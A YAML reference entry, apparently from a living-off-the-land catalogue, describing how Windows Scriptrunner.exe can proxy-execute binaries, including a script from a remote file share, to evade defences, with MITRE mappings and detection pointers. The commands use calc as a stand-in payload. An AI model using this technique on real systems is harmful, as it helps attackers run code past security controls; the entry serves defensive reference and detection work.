---
Name: Scriptrunner.exe
Description:
Author: 'Oddvar Moe'
Created: 2018-05-25
Commands:
  - Command: Scriptrunner.exe -appvscript calc.exe
    Description: Executes calc.exe
    Usecase: Execute binary through proxy binary to evade defensive counter measures
    Category: Execute
    Privileges: User
    MitreID: T1202
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: ScriptRunner.exe -appvscript "\\fileserver\calc.cmd"
    Description: Executes calc.cmd from remote server
    Usecase: Execute binary through proxy binary from external server to evade defensive counter measures
    Category: Execute
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
Full_Path:
  - Path: C:\Windows\System32\scriptrunner.exe
  - Path: C:\Windows\SysWOW64\scriptrunner.exe
Code_Sample:
  - Code:
Detection:
  - Sigma: https://github.com/SigmaHQ/sigma/blob/765acac3742310764495ed5a2006bc0ced5b1a67/rules/windows/process_creation/win_susp_servu_process_pattern.yml
  - IOC: Scriptrunner.exe should not be in use unless App-v is deployed
Resources:
  - Link: https://twitter.com/KyleHanslovan/status/914800377580503040
  - Link: https://twitter.com/NickTyrer/status/914234924655312896
  - Link: https://github.com/MoooKitty/Code-Execution
Acknowledgement:
  - Person: Nick Tyrer
    Handle: '@nicktyrer'
---
